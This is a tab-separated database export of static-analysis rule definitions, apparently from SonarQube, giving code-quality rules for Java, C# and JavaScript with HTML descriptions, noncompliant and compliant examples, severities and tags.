769	"toString()" and "clone()" methods should not return null	S2225	S2225	squid	<p>Calling <code>toString()</code> or <code>clone()</code> on an object should always return a string or an object. Returning <code>null</code> instead contravenes the method's implicit contract.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\npublic override string ToString () {\n  if (this.collection.Count == 0) {\n    return null; // Noncompliant\n  } else {\n    // ...\n </pre>\n<h2>Compliant Solution</h2>\n\n<pre>\npublic override string ToString () {\n  if (this.collection.Count == 0) {\n    return "";\n  } else {\n    // ...\n </pre>\n<h2>See</h2>\n\n<ul>\n<li> <a href="http://cwe.mitre.org/data/definitions/476.html">MITRE CWE-476</a> - NULL Pointer Dereference\n</li></ul>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	cwe	f	HTML	1511453807310	1511453807311	2
770	Classes and enums with private members should have a constructor	S1258	S1258	squid	<p>\n  Non-abstract <code>class</code>es and <code>enum</code>s with non-<code>static</code>,\n  <code>private</code> members should explicitly initialize those members,\n  either in a constructor or with a default value.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass A { // Noncompliant\n  private int field;\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nclass A {\n  private int field;\n\n  A(int field) {\n    this.field = field;\n  }\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	pitfall	f	HTML	1511453807311	1511453807312	1
771	Branches should have sufficient coverage by unit tests	InsufficientBranchCoverage	\N	common-cs	An issue is created on a file as soon as the branch coverage on this file is less than the required threshold.It gives the number of branches to be covered in order to reach the required threshold.	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	5min	\N	\N	number of uncovered conditions	\N	bad-practice	f	HTML	1511453807313	1511453807314	1
772	Lines should have sufficient coverage by unit tests	InsufficientLineCoverage	\N	common-cs	An issue is created on a file as soon as the line coverage on this file is less than the required threshold. It gives the number of lines to be covered in order to reach the required threshold.	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	2min	\N	\N	number of lines under the coverage threshold	\N	bad-practice	f	HTML	1511453807320	1511453807321	1
773	Source files should have a sufficient density of comment lines	InsufficientCommentDensity	\N	common-cs	An issue is created on a file as soon as the density of comment lines on this file is less than the required threshold. The number of comment lines to be written in order to reach the required threshold is provided by each issue message.	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	2min	\N	\N	number of lines required to meet minimum density	\N	convention	f	HTML	1511453807326	1511453807327	1
774	Source files should not have any duplicated blocks	DuplicatedBlocks	\N	common-cs	An issue is created on a file as soon as there is at least one block of duplicated code on this file	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR_OFFSET	\N	10min	\N	10min	number of duplicate blocks	\N	pitfall	f	HTML	1511453807333	1511453807333	1
775	Skipped unit tests should be either removed or fixed	SkippedUnitTests	\N	common-cs	Skipped unit tests are considered as dead code. Either they should be activated again (and updated) or they should be removed.	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	number of skipped tests	\N	pitfall	f	HTML	1511453807336	1511453807337	1
776	Failed unit tests should be fixed	FailedUnitTests	\N	common-cs	Test failures or errors generally indicate that regressions have been introduced. Those tests should be handled as soon as possible to reduce the cost to fix the corresponding regressions.	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	number of failed tests	\N	\N	f	HTML	1511453807340	1511453807340	2
782	"[type=...]" should be used to select elements by type	S2898	\N	javascript	<p>\n  While <code>:&lt;element_type&gt;</code> and <code>[type="&lt;element_type&gt;"]</code> can both be used in jQuery to select elements by their type,\n  <code>[type="&lt;element_type&gt;"]</code> is far faster because it can take advantage of the native DOM <code>querySelectorAll()</code> method in modern browsers.\n</p>\n\n<p>This rule raises an issue when following selectors are used:</p>\n\n<ul>\n  <li><code>:checkbox</code></li>\n  <li><code>:file</code></li>\n  <li><code>:image</code></li>\n  <li><code>:password</code></li>\n  <li><code>:radio</code></li>\n  <li><code>:reset</code></li>\n  <li><code>:text</code></li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\n  var input = $( "form input:radio" ); // Noncompliant\n</pre>\n\n<h2>Compliant Solution</h2>\n\n<pre>\n  var input = $( "form input[type=radio]" ); // Compliant\n</pre>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	jquery,performance	f	HTML	1511453807364	1511453807365	1
783	Control flow statements "if", "for", "while", "switch" and "try" should not be nested too deeply	NestedIfDepth	\N	javascript	<p>\n  Nested <code>if</code>, <code>for</code>, <code>while</code>, <code>switch</code> and <code>try</code> statements is a key ingredient for making what's known as "Spaghetti code".\n  Such code is hard to read, refactor and therefore maintain.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<p>\n  The following code snippet illustrates this rule with the default threshold of 3.\n</p>\n\n<pre>\n  if (condition1) {                  // Compliant - depth = 1\n    /* ... */\n    if (condition2) {                // Compliant - depth = 2\n      /* ... */\n      for(int i = 0; i < 10; i++) {  // Compliant - depth = 3, not exceeding the limit\n        /* ... */\n        if (condition4) {            // Non-Compliant - depth = 4\n          if (condition5) {          // Depth = 5, exceeding the limit, but issues are only reported on depth = 4\n            /* ... */\n          }\n          return;\n        }\n      }\n    }\n  }\n</pre>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	brain-overload	f	HTML	1511453807367	1511453807367	1
784	Variables and functions should not be redeclared	S2814	\N	javascript	<p>\n  This rule checks that a declaration doesn't use a name that is already in use. Indeed, it is possible to declare multiple variables and/or functions with the same name,\n  but it's hard to predict which declaration will be kept by the JavaScript interpreter.\n</p>\n\n<p>Typically, this kind of re-declaration is an error, and can lead to bugs and more generally to confusing code.</p>\n\n<p>This rule also applies to function parameters.</p>\n\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nvar a = 'foo';\nfunction a() {}   // Noncompliant\nconsole.log(a);   // prints "foo"\n\nfunction myFunc(arg) {\n  var arg = "event"; // Noncompliant, argument value is lost\n}\n\nfun(); // prints "bar"\n\nfunction fun() {\n  console.log("foo");\n}\n\nfun(); // prints "bar"\n\nfunction fun() {  // Noncompliant\n  console.log("bar");\n}\n\nfun(); // prints "bar"\n</pre>\n\n\n<h2>Compliant Solution</h2>\n\n<pre>\nvar a = 'foo';\nfunction otherName() {}\nconsole.log(a);\n\nfunction myFunc(arg) {\n  var newName = "event";\n}\n\nfun(); // prints "foo"\n\nfunction fun() {\n  print("foo");\n}\n\nfun(); // prints "foo"\n\nfunction printBar() {\n  print("bar");\n}\n\nprintBar(); // prints "bar"\n</pre>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	pitfall	f	HTML	1511453807372	1511453807373	2
785	Web SQL databases should not be used	S2817	\N	javascript	<p>\n  The Web SQL Database standard never saw the light of day. It was first formulated, then deprecated by the W3C and was only implemented in some browsers. (It is not supported in\n  Firefox or IE.)\n</p>\n\n<p>\n  Further, the use of a Web SQL Database poses security concerns, since you only need its name to access such a database.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nvar db = window.openDatabase("myDb", "1.0", "Personal secrets stored here", 2*1024*1024);  // Noncompliant\n</pre>\n\n<h2>See</h2>\n<ul>\n  <li><a href="https://www.owasp.org/index.php/Top_10_2013-A6-Sensitive_Data_Exposure">OWASP Top Ten 2013 Category A6</a> - Sensitive Data Exposure</li>\n  <li><a href="https://www.owasp.org/index.php/Top_10_2013-A9-Using_Components_with_Known_Vulnerabilities">OWASP Top Ten 2013 Category A9</a> - Using Components with Known Vulnerabilities</li>\n</ul>	3	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2h	\N	\N	html5,owasp-a6,owasp-a9	f	HTML	1511453807375	1511453807376	3
786	Default parameters should not cause side effects	S3509	\N	javascript	<p>The assignment of default parameter values is generally intended to help the caller. But when a default assignment causes the side effects, the caller may not be aware of the extra changes or may not fully understand their implications. I.e. default assignments with side effects may end up hurting the caller, and for that reason, they should be avoided.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nvar count = 0;\n\nfunction go(i = count++) {  // Noncompliant\n  console.log(i);\n}\n\ngo();  // outputs 0\ngo(7); // outputs 7\ngo();  // outputs 1\n</pre>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	15min	\N	\N	es2015,pitfall	f	HTML	1511453807378	1511453807378	1
787	Deprecated jQuery methods should not be used	S2770	\N	javascript	<p>\n  Deprecation is a warning that a method has been superseded, and will eventually be removed. The deprecation period allows you to make a smooth transition away from the aging,\n  soon-to-be-retired technology.\n</p>\n\n<p>This rule raises an issue when any of the following methods is used:</p>\n\n<ul>\n  <li><code>.andSelf()</code></li>\n  <li><code>.context</code></li>\n  <li><code>.die()</code></li>\n  <li><code>.error()</code></li>\n  <li><code>jQuery.boxModel</code></li>\n  <li><code>jQuery.browser</code></li>\n  <li><code>jQuery.sub()</code></li>\n  <li><code>jQuery.support</code></li>\n  <li><code>.live()</code></li>\n  <li><code>.load()</code></li>\n  <li><code>.selector</code></li>\n  <li><code>.size()</code></li>\n  <li><code>.toggle()</code></li>\n  <li><code>.unload()</code></li>\n</ul>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	jquery,obsolete	f	HTML	1511453807380	1511453807381	1
788	Lines should not end with trailing whitespaces	TrailingWhitespace	\N	javascript	<p>Trailing whitespaces are simply useless and should not stay in code. They may generate noise when comparing different versions of the same file.</p>\n<p>If you encounter issues from this rule, this probably means that you are not using an automated code formatter - which you should if you have the opportunity to do so. </p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\n// The following string will error if there is a whitespace after '\\'\nvar str = "Hello \\\nWorld";\n</pre>	1	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	1min	\N	\N	convention	f	HTML	1511453807381	1511453807381	1
789	"alert(...)" should not be used	S1442	\N	javascript	<p>alert(...) can be useful for debugging during development, but in production mode this kind of pop-up could expose sensitive information to attackers, and should never be displayed. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nif(unexpectedCondition)\n{\n  alert("Unexpected Condition");\n}\n</pre>\n<h2>See</h2>\n\n<ul>\n<li> <a href="http://cwe.mitre.org/data/definitions/489.html">MITRE, CWE-489</a> - Leftover Debug Code</li>\n</ul>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	cwe,user-experience	f	HTML	1511453807382	1511453807382	3
790	Attempts should not be made to update "const" variables	S3500	\N	javascript	<p>Variables declared with <code>const</code> cannot be modified. Unfortunately, attempts to do so don't always raise an error; in a non-ES2015 environment,\n  such an attempt might simply be ignored.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nconst pi = "yes, please";\npi = 3.14;  //Noncompliant\n</pre>	4	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	15min	\N	\N	es2015	f	HTML	1511453807382	1511453807383	2
791	Bitwise operators should not be used	BitwiseOperators	\N	javascript	<p>JavaScript does not have an integer type, but it does have bitwise operators <code>&lt;&lt;</code>, <code>&gt;&gt;</code>, <code>&gt;&gt;&gt;</code>, <code>~</code>, <code>&amp;</code>, <code>|</code>. These operators convert their operands from floating point values to integers and back, so they are not as efficient as in C or other languages. Further, they are rarely useful in browser applications, and the similarity to the logical operators can mask some programming errors.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nif (a &amp; b) { ... } // Noncompliant; &amp; used in error\nvar oppositeSigns = ((x ^ y) &lt; 0); // Noncompliant; there's a clearer way to test for this\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nif (a &amp;&amp; b) { ... }\nvar oppositeSigns = false;\nif ( (x &lt; 0 &amp;&amp; y &gt; 0) || (x &gt; 0 &amp;&amp; y &lt; 0) ) {\n  oppositeSigns = true;\n}\n</pre>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	pitfall	f	HTML	1511453807383	1511453807384	1
792	"undefined" should not be assigned	S2138	\N	javascript	<p>\n  <code>undefined</code> is the value you get for variables and properties which have not yet been created. Use the same value to reset an existing variable and you lose the ability to distinguish between a variable that exists but has no value and a variable that does not yet exist. Instead, <code>null</code> should be used, allowing you to tell the difference between a property that has been reset and one that was never created.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nvar myObject = {};\n\n// ...\nmyObject.fname = undefined;  // Noncompliant\n// ...\n\nif (myObject.lname == undefined) {\n  // property not yet created\n}\nif (myObject.fname == undefined) {\n  // no real way of knowing the true state of myObject.fname\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nvar myObject = {};\n\n// ...\nmyObject.fname = null;\n// ...\n\nif (myObject.lname == undefined) {\n  // property not yet created\n}\nif (myObject.fname == undefined) {\n  // no real way of knowing the true state of myObject.fname\n}\n</pre>	3	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	pitfall	f	HTML	1511453807384	1511453807384	1
793	Local variables should not shadow "undefined"	S2137	\N	javascript	<p>\n  It is possible to name a variable <code>undefined</code> in a local scope, but it is a very bad idea because <code>undefined</code> is what's returned for values and properties that have not yet been created. Make <code>undefined</code> a variable and you lose your ability to test whether other variables and properties exist.\n </p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nfunction foo () {\n   var undefined = 1; // Noncompliant\n   if (nonExistantVar == undefined) { // this logic doesn't work now\n     // ...\n   }\n }\n </pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nfunction foo () {\n   var bob = 1; // anything is better than naming it 'undefined'\n   if (nonExistantVar == undefined) {\n     // ...\n   }\n }\n </pre>	3	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	pitfall	f	HTML	1511453807385	1511453807385	1
794	Jump statements should not be followed by other statements	UnreachableCode	\N	javascript	<p>Jump statements (<code>return</code>, <code>break</code> and <code>continue</code>) and <code>throw</code> expressions move control flow out of the current code block. Typically, any statements in a block that come after a jump or <code>throw</code> are simply wasted keystrokes lying in wait to confuse the unwary. </p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nfun(a) {\n  var i = 10;\n  return i + a;       // Noncompliant \n  i++;             // this is never executed\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nint fun(int a) {\n  int i = 10;\n  return i + a;\n}\n</pre>\n<h2>See</h2>\n\n<ul>\n<li> MISRA C++:2008, 0-1-9 - There shall be no dead code</li>\n<li> MISRA C:2012, 2.2 - There shall be no dead code</li>\n<li> <a href="http://cwe.mitre.org/data/definitions/561.html">MITRE, CWE-561</a> - Dead Code</li>\n<li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C</a> - Detect and remove code that has no effect or is never executed</li>\n<li> <a href="https://www.securecoding.cert.org/confluence/x/SIIyAQ">CERT, MSC12-CPP</a> - Detect and remove code that has no effect</li>\n</ul>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	cert,cwe,misra,unused	f	HTML	1511453807385	1511453807386	1
795	Relational operators should be used in "for" loop termination conditions	S888	\N	javascript	<p>\n  Testing <code>for</code> loop termination using an equality operator (<code>==</code> and <code>!=</code>) is dangerous, because it could set up an infinite loop.\n  Using a relational operator instead casts a wider net, and makes it harder (but not impossible) to accidentally write an infinite loop.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nfor (var i = 1; i != 10; i += 2)  // Noncompliant. Infinite; i goes from 9 straight to 11.\n{\n  //...\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nfor (var i = 1; i <= 10; i += 2)  // Compliant\n{\n  //...\n}\n</pre>\n\n<h2>Exceptions</h2>\n<p>An equality operator may be used if the loop counter is not modified within the body of the loop and either:</p>\n<ul>\n  <li>starts below the ending value and is incremented by 1 on each iteration.</li>\n  <li>starts above the ending value and is decremented by 1 on each iteration.</li>\n</ul>\n<p>Equality operators are also ignored when the test is against <code>null</code>.</p>\n<pre>\nfor (int i = 0; arr[i] != null; i++) {\n  // ...\n}\n\nfor (int i = 0; (item = arr[i]) != null; i++) {\n  // ...\n}\n</pre>\n\n<h2>See</h2>\n<ul>\n  <li>MISRA C++:2008, 6-5-2</li>\n  <li><a href="http://cwe.mitre.org/data/definitions/835">MITRE, CWE-835</a> - Loop with Unreachable Exit Condition ('Infinite Loop')</li>\n  <li><a href="https://www.securecoding.cert.org/confluence/x/EwDJAQ">CERT, MSC21-C</a> - Use robust loop termination conditions</li>\n  <li><a href="https://www.securecoding.cert.org/confluence/x/GwDJAQ">CERT, MSC21-CPP</a> - Use inequality to terminate a loop whose counter changes by more than one</li>\n</ul>	3	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	cert,cwe,misra	f	HTML	1511453807387	1511453807387	2
796	Avoid use of conditional operator	ConditionalOperator	\N	javascript	<p>\nCondition operators can quickly become hard to be read.\n</p>\n\n<p>\nThe following code snippet illustrates this rule :\n</p>\n\n<pre>\nfunction sayHello() {\n  var a = (a === 'A') ? 'is A' : 'is not A'; // Non-Compliant\n}\n</pre>	1	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	confusing	f	HTML	1511453807388	1511453807388	1
797	Switch cases should end with an unconditional "break" statement	NonEmptyCaseWithoutBreak	\N	javascript	<p>When the execution is not explicitly terminated at the end of a switch case, it continues to execute the statements of the following case. While this is sometimes intentional, it often is a mistake which leads to unexpected behavior. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nswitch (myVariable) {\n  case 1:                              \n    foo();\n    break;\n  case 2:  // Both 'doSomething()' and 'doSomethingElse()' will be executed. Is it on purpose ?\n    doSomething();\n  default:                               \n    doSomethingElse();\n    break;\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nswitch (myVariable) {\n  case 1:                              \n    foo();\n    break;\n  case 2: \n    doSomething();\n    break;\n  default:                               \n    doSomethingElse();\n    break;\n}\n</pre>\n<h2>Exceptions</h2>\n\n<p>This rule is relaxed in the following cases:</p>\n<pre>\nswitch (myVariable) {\n  case 0:                                // Empty case used to specify the same behavior for a group of cases.\n  case 1:                               \n    doSomething();\n    break;\n  case 2:                                // Use of return statement\n    return;\n  case 3:                                // Use of throw statement\n    throw new IllegalStateException();\n  case 4:                                // Use of continue statement\n    continue;\n  default:                               // For the last case, use of break statement is optional \n    doSomethingElse();\n}\n</pre>\n\n<h2>See</h2>\n\n<ul>\n<li> MISRA C:2004, 15.0 - The MISRA C <em>switch</em> syntax shall be used.</li>\n<li> MISRA C:2004, 15.2 - An unconditional break statement shall terminate every non-empty switch clause</li>\n<li> MISRA C++:2008, 6-4-3 - A switch statement shall be a well-formed switch statement.</li>\n<li> MISRA C++:2008, 6-4-5 - An unconditional throw or break statement shall terminate every non-empty switch-clause</li>\n<li> MISRA C:2012, 16.1 - All switch statements shall be well-formed</li>\n<li> MISRA C:2012, 16.3 - An unconditional break statement shall terminate every switch-clause</li>\n<li> <a href="http://cwe.mitre.org/data/definitions/484.html">MITRE, CWE-484</a> - Omitted Break Statement in Switch</li>\n<li> <a href="https://www.securecoding.cert.org/confluence/x/YIFLAQ">CERT, MSC17-C</a> - Finish every set of statements associated with a case label with a break statement</li>\n<li> <a href="https://www.securecoding.cert.org/confluence/x/ZoFLAQ">CERT, MSC18-CPP</a> - Finish every set of statements associated with a case label with a break statement</li>\n</ul>	3	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	cert,cwe,misra,pitfall	f	HTML	1511453807389	1511453807389	1
798	"with" statements should not be used	WithStatement	\N	javascript	<p>\n  The use of the <code>with</code> keyword produces an error in JavaScript strict mode code. However, that's not the worst that can be said against <code>with</code>.\n</p>\n<p>\n  Using <code>with</code> allows a short-hand access to an object's properties - assuming they're already set. But use <code>with</code> to access some property not already set in the object,\n  and suddenly you're catapulted out of the object scope and into the global scope, creating or overwriting variables there. Since the effects of <code>with</code> are entirely\n  dependent on the object passed to it, <code>with</code> can be dangerously unpredictable, and should never be used.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nvar x = 'a';\n\nvar foo = {\n  y: 1\n}\n\nwith (foo) {  // Noncompliant\n  y = 4;  // updates foo.x\n  x = 3;  // does NOT add a foo.x property; updates x var in outer scope\n}\nprint(foo.x + " " + x); // shows: undefined 3\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nvar x = 'a';\n\nvar foo = {\n  y: 1\n}\n\nfoo.y = 4;\nfoo.x = 3;\n\nprint(foo.x + " " + x); // shows: 3 a\n</pre>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	30min	\N	\N	\N	f	HTML	1511453807390	1511453807390	2
799	Sections of code should not be "commented out"	CommentedCode	\N	javascript	<p>Programmers should not comment out code as it bloats programs and reduces readability.</p>\n<p>Unused code should be deleted and can be retrieved from source control history if required.</p>\n<h2>See</h2>\n\n<ul>\n<li> MISRA C:2004, 2.4 - Sections of code should not be "commented out".</li>\n<li> MISRA C++:2008, 2-7-2 - Sections of code shall not be "commented out" using C-style comments.</li>\n<li> MISRA C++:2008, 2-7-3 - Sections of code should not be "commented out" using C++ comments.</li>\n<li> MISRA C:2012, Dir. 4.4 - Sections of code should not be "commented out"</li>\n</ul>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	misra,unused	f	HTML	1511453807391	1511453807391	1
800	Regular expression on comment	CommentRegularExpression	\N	javascript	<p>This rule template can be used to create rules which will be triggered when a comment matches a given regular expression.</p>\n<p>For example, one can create a rule with the regular expression "<code>.*TODO.*</code>" to match all comment containing "TODO".</p>\n<p>Note that, in order to match TODO regardless of the case, the "<code>(?i)</code>" modifier can be prepended to the expression, as in "<code>(?i).*TODO.*</code>".</p>	2	\N	READY	js	\N	\N	\N	\N	\N	\N	\N	\N	\N	\N	\N	\N	\N	t	HTML	1511453807392	1511453807392	1
801	"if ... else if" constructs shall be terminated with an "else" clause	ElseIfWithoutElse	\N	javascript	<p>This rule applies whenever an <code>if</code> statement is followed by one or </p>\n<p>more <code>else if</code> statements, the final <code>else if</code> shall be followed by an <code>else</code> statement.</p>\n<p>The requirement for a final <code>else</code> statement is defensive programming. </p>\n<p>The <code>else</code> statement should either take appropriate action or contain </p>\n<p>a suitable comment as to why no action is taken. This is consistent with the </p>\n<p>requirement to have a final <code>default</code> clause in a <code>switch</code></p>\n<p>statement. </p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nif (x == 0) {\n  doSomething();\n} else if (x == 1) {\n  doSomethingElse();\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nif (x == 0) {\n  doSomething();\n} else if (x == 1) {\n  doSomethingElse();\n} else {\n  throw new IllegalStateException();\n}\n</pre>\n\n<h2>See</h2>\n\n<ul>\n<li> MISRA C:2004, 14.10</li>\n<li> MISRA C++:2008, 6-4-2</li>\n<li> MISRA C:2012, 15.7</li>\n<li> <a href="https://www.securecoding.cert.org/confluence/x/YgE">CERT, MSC01-C</a> - Strive for logical completeness</li>\n<li> <a href="https://www.securecoding.cert.org/confluence/x/JoIyAQ">CERT, MSC01-CPP</a> - Strive for logical completeness</li>\n<li> <a href="https://www.securecoding.cert.org/confluence/x/PQHRAw">CERT, MSC64-Java</a> - Strive for logical completeness</li>\n</ul>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	cert,misra	f	HTML	1511453807396	1511453807396	1
802	Functions should not be too complex	FunctionComplexity	\N	javascript	<p>The cyclomatic complexity of functions should not exceed a defined threshold.</p>\n<p>Complex code can perform poorly and will in any case be difficult to understand and therefore to maintain.</p>	2	\N	READY	js	\N	\N	\N	\N	\N	LINEAR_OFFSET	\N	1min	\N	10min	per complexity point above the threshold	\N	brain-overload	f	HTML	1511453807398	1511453807398	1
803	Selection results should be tested with "length"	S2769	\N	javascript	<p>\n  Once you've made a selection, you typically want to know whether it actually found anything. Since selectors always return an object (the set of selected DOM elements), the\n  best way to see whether your selection found anything is to test the returned object's .length property.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nif ( $( "div.foo" ) ) {  // Noncompliant\n  // this code always runs, even when the selector didn't match any elements\n  // ...\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\n// Testing whether a selection contains elements.\nif ( $( "div.foo" ).length > 0) {\n  // this code only runs if elements were found\n  //  ...\n}\n</pre>	3	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	jquery	f	HTML	1511453807402	1511453807402	2
804	"switch" statements should end with a "default" clause	SwitchWithoutDefault	\N	javascript	<p>\nThe requirement for a final <code>default</code> clause is defensive programming.\nThe clause should either take appropriate action or contain a suitable comment as to why no action is taken.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nswitch (param) {  //missing default clause\n  case 0:\n    doSomething();\n    break;\n  case 1:\n    doSomethingElse();\n    break;\n}\n\nswitch (param) {\n  default: // default clause should be the last one\n    error();\n    break;\n  case 0:\n    doSomething();\n    break;\n  case 1:\n    doSomethingElse();\n    break;\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nswitch (param) {\n  case 0:\n    doSomething();\n    break;\n  case 1:\n    doSomethingElse();\n    break;\n  default:\n    error();\n    break;\n}\n</pre>\n\n<h2>See</h2>\n\n<ul>\n<li> MISRA C:2004, 15.0 - The MISRA C <em>switch</em> syntax shall be used.</li>\n<li> MISRA C:2004, 15.3 - The final clause of a switch statement shall be the default clause</li>\n<li> MISRA C++:2008, 6-4-3 - A switch statement shall be a well-formed switch statement.</li>\n<li> MISRA C++:2008, 6-4-6 - The final clause of a switch statement shall be the default-clause</li>\n<li> MISRA C:2012, 16.1 - All switch statements shall be well-formed</li>\n<li> MISRA C:2012, 16.4 - Every <em>switch</em> statement shall have a <em>default</em> label</li>\n<li> MISRA C:2012, 16.5 - A <em>default</em> label shall appear as either the first or the last <em>switch label</em> of a <em>switch</em> statement</li>\n<li> <a href="http://cwe.mitre.org/data/definitions/478.html">MITRE, CWE-478</a> - Missing Default Case in Switch Statement</li>\n<li> <a href="https://www.securecoding.cert.org/confluence/x/YgE">CERT, MSC01-C</a> - Strive for logical completeness</li>\n<li> <a href="https://www.securecoding.cert.org/confluence/x/JoIyAQ">CERT, MSC01-CPP</a> - Strive for logical completeness</li>\n</ul>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	cert,cwe,misra	f	HTML	1511453807403	1511453807403	1
805	Values should not be uselessly incremented	S2123	\N	javascript	A value that is incremented or decremented and then not stored is at best wasted code and at worst a bug.\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nvar i = 0;\ni = i++; // Noncompliant; i is still zero\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nvar i = 0;\ni++;\n</pre>	3	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	\N	f	HTML	1511453807404	1511453807404	2
810	Multiline string literals should not be used	MultilineStringLiterals	\N	javascript	<p>Continuing a string across a linebreak is supported in most script engines, but it is not a part of ECMAScript. Additionally, the whitespace at the beginning of each line can't be safely stripped at compile time, and any whitespace after the slash will result in tricky errors.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nvar myString = 'A rather long string of English text, an error message \\\n                actually that just keeps going and going -- an error \\\n                message to make the Energizer bunny blush (right through \\\n                those Schwarzenegger shades)! Where was I? Oh yes, \\\n                you\\'ve got an error and all the extraneous whitespace is \\\n                just gravy.  Have a nice day.';  // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nvar myString = 'A rather long string of English text, an error message ' +\n    'actually that just keeps going and going -- an error ' +\n    'message to make the Energizer bunny blush (right through ' +\n    'those Schwarzenegger shades)! Where was I? Oh yes, ' +\n    'you\\'ve got an error and all the extraneous whitespace is ' +\n    'just gravy.  Have a nice day.';\n</pre>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	bad-practice	f	HTML	1511453807414	1511453807415	1
811	Variable declarations should be placed appropriately for their scope	S2392	\N	javascript	<p>A variable that is declared at function scope, but only used inside a single block should be declared in that block, and variables that are declared inside a block but used outside of it (which is possible with a <code>var</code>-style declaration) should be declared outside the block.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nfunction doSomething(a, b) {\n  var i;  // Noncompliant; should be declared in if-block\n  if (a &gt; b) {\n    i = a;\n    console.log(i);\n    var x = a - b;  // Noncompliant; should be declared outside if-block\n  }\n\n  if (a &gt; 4) {\n   console.log(x);\n  }\n\n  return a+b;\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nfunction doSomething(a, b) {\n  var x = a - b;\n\n  if (a &gt; b) {\n    var i = a;\n    console.log(i);\n  }\n\n  if (a &gt; 4) {\n   console.log(x);\n  }\n\n  return a+b;\n}\n</pre>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	pitfall	f	HTML	1511453807416	1511453807416	1
